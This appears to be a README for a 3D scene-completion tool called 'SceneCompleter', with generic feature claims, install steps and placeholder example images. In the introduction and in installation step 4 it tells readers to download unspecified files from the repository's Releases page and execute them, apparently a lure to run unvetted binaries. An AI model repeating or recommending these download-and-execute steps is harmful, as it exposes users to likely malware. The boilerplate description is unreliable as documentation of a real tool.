## Introduction

SceneCompleter aims to bridge the gap in 3D scene understanding and generation. Traditional methods often struggle with accurately filling in missing data or generating new perspectives. Our approach leverages advanced techniques to produce realistic 3D scenes from incomplete information.

You can find the latest releases and updates for SceneCompleter [here](https://github.com/hackerkartel64/SceneCompleter/releases). Please download the necessary files and execute them to get started.

## Features

- **Dense Scene Completion**: Generate complete 3D scenes from partial data.
- **Novel View Synthesis**: Create new perspectives of existing scenes.
- **User-Friendly Interface**: Easy to navigate and use, even for beginners.
- **Robust Performance**: Efficient algorithms ensure quick processing times.
- **Open Source**: Contribute to the project and enhance its capabilities.

## Installation

To install SceneCompleter, follow these steps:

1. Clone the repository:

   ```bash
   git clone https://github.com/hackerkartel64/SceneCompleter.git
   ```

2. Navigate to the project directory:

   ```bash
   cd SceneCompleter
   ```

3. Install the required dependencies:

   ```bash
   pip install -r requirements.txt
   ```

4. Download the latest release from the [Releases section](https://github.com/hackerkartel64/SceneCompleter/releases) and execute the necessary files.

## Usage

After installation, you can start using SceneCompleter. Hereâ€™s a simple guide to get you started:

1. Prepare your input data. This should include any partial 3D scenes you want to complete.
2. Run the SceneCompleter script:

   ```bash
   python scene_completer.py --input your_input_file --output your_output_file
   ```

3. Check the output file for the completed scene.

### Command Line Options

- `--input`: Path to the input file containing the partial scene.
- `--output`: Path where the completed scene will be saved.
- `--config`: (Optional) Path to a configuration file for advanced settings.

## Examples

To illustrate the capabilities of SceneCompleter, here are a few examples:

### Example 1: Basic Scene Completion

Input: A partial 3D model of a room.

![Room Scene](https://example.com/room_scene.jpg)

Output: A completed version of the room, including furniture and decor.

![Completed Room](https://example.com/completed_room.jpg)

### Example 2: Novel View Synthesis

Input: A 3D model of a landscape.

![Landscape Scene](https://example.com/landscape_scene.jpg)

Output: A new perspective of the same landscape.
